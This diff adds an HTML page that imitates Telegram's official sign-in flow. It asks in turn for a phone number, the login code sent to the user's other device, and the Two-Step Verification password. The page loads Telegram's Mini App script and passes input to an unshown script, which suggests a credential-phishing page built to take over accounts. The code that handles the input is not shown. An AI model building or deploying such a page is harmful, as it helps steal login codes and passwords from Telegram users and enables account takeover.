@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <link rel="stylesheet" href="css/telegram-auth.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
+</head>
+<body>
+    <div id="auth-phone-number-form" class="custom-scroll">
+        <div class="auth-form">
+            <div id="logo"></div>
+            <h1>Sign in to Telegram</h1>
+            <p class="note">Please confirm your country code<br>and enter your phone number.</p>
+            <form class="form" action="" onsubmit="return false;">
+                
+                <!-- Country Code Input -->
+                <div class="CountryCodeInput">
+                    <div class="input-group touched" id="country-input-group">
+                        <input 
+                            type="text" 
+                            class="form-control" 
+                            id="country-display" 
+                            value="" 
+                            readonly
+                            autocomplete="off"
+                        >
+                        <label for="country-display">Country</label>
+                        <i class="css-icon-down" id="country-arrow"></i>
+                    </div>
+                    
+                    <div class="dropdown-menu" id="country-dropdown">
+                        <!-- Countries will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <!-- Phone Number Input -->
+                <div class="phone-input-wrapper">
+                    <div class="input-group" id="phone-input-group">
+                        <input 
+                            type="tel"
+                            class="form-control phone-input-field" 
+                            id="phone-input"
+                            autocomplete="off"
+                            inputmode="tel"
+                            placeholder=""
+                        >
+                        <label for="phone-input">Your phone number</label>
+                    </div>
+                </div>
+
+                <div class="loading-indicator" id="loading-indicator" style="display: none;"></div>
+
+                <!-- Next Button -->
+                <button id="phone-submit" class="Button size-smaller color-primary" type="submit">
+                    <span class="btn-text">Next</span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Code verification form (initially hidden) -->
+    <div id="code-form" class="custom-scroll" style="display: none;">
+        <div class="auth-form">
+            <div id="monkey" class="monkey-animation">
+                <lottie-player
+                    id="monkey-lottie"
+                    src="assets/lottie/TwoFactorSetupMonkeyIdle.json"
+                    background="transparent"
+                    speed="1"
+                    style="width: 160px; height: 160px;"
+                    autoplay>
+                </lottie-player>
+            </div>
+            <h1>
+                <span id="phone-display">+972 58 577 0060</span>
+                <div class="auth-number-edit div-button" role="button" tabindex="0" title="Wrong number?" aria-label="Wrong number?" id="edit-phone-btn">
+                    <i class="icon icon-edit" aria-hidden="true"></i>
+                </div>
+            </h1>
+            <p class="note">We've sent the code to the <b>Telegram</b> app on your other device.</p>
+            
+            <form id="code-submission-form" class="form">
+                <div class="input-group code-input-group">
+                    <input 
+                        type="text"
+                        class="form-control code-input-field" 
+                        id="code-input"
+                        autocomplete="off"
+                        inputmode="numeric"
+                        maxlength="5"
+                    >
+                    <label for="code-input">Code</label>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Password form (initially hidden) -->
+    <div id="password-form" class="custom-scroll" style="display: none;">
+        <div class="auth-form">
+            <div id="password-monkey" class="monkey-animation">
+                <lottie-player
+                    id="password-monkey-lottie"
+                    src="assets/lottie/TwoFactorSetupMonkeyPeek.json"
+                    background="transparent"
+                    speed="1"
+                    style="width: 160px; height: 160px;">
+                </lottie-player>
+            </div>
+            <h1>Enter Password</h1>
+            <p class="note">You have Two-Step Verification enabled, so your account is protected with an additional password.</p>
+            
+            <form id="password-submission-form" class="form">
+                <div class="input-group password-input-group">
+                    <input 
+                        type="password"
+                        class="form-control" 
+                        id="password-input"
+                        autocomplete="current-password"
+                        maxlength="256"
+                        dir="auto"
+                    >
+                    <label for="password-input">Password</label>
+                    <div class="div-button toggle-password" role="button" tabindex="0" title="Toggle password visibility" aria-label="Toggle password visibility">
+                        <i class="icon icon-eye-crossed" aria-hidden="true"></i>
+                    </div>
+                </div>
+                
+                <button id="password-submit" class="Button size-smaller color-primary" type="submit">
+                    <span class="btn-text">Next</span>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Import the main module -->
+    <script type="module" src="js/telegram-auth.js"></script>
+</body>
+</html>
